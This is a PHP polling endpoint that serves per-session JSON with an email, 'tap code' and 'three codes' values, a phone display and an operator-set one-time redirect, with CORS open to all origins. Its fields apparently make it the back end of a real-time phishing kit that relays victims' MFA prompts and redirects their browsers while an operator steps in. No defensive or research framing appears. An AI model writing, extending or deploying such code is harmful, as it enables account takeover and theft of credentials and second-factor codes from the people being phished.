<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-cache, no-store, must-revalidate');

$sessionId = $_GET['session_id'] ?? '';

if (empty($sessionId)) {
    http_response_code(400);
    echo json_encode(['redirect' => '', 'error' => 'No session ID']);
    exit;
}

$sessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
$sessionFile = SESSION_DIR . '/session_' . $sessionId . '.json';

$result = [
    'redirect' => '',
    'email' => '',
    'tap_code_value' => '',
    'three_codes_value' => '',
    'phone_display' => '',
    'timestamp' => microtime(true),
    'session_id' => $sessionId
];

if (file_exists($sessionFile)) {
    $content = @file_get_contents($sessionFile);
    if ($content) {
        $data = json_decode($content, true);
        if (is_array($data)) {
            $result['email'] = $data['email'] ?? '';
            $result['tap_code_value'] = $data['tap_code_value'] ?? '';
            $result['three_codes_value'] = $data['three_codes_value'] ?? '';
            $result['phone_display'] = $data['phone_display'] ?? '';
            $result['redirect'] = $data['redirect'] ?? '';
            $result['redirect_time'] = $data['redirect_time'] ?? '';
            $result['redirect_source'] = $data['redirect_source'] ?? '';
            
            // Clear redirect after reading
            if (!empty($result['redirect'])) {
                $data['redirect'] = '';
                $data['read_time'] = microtime(true);
                @file_put_contents($sessionFile, json_encode($data), LOCK_EX);
            }
        }
    }
} else {
    http_response_code(404);
    $result['error'] = 'Session not found';
}

echo json_encode($result);
?>
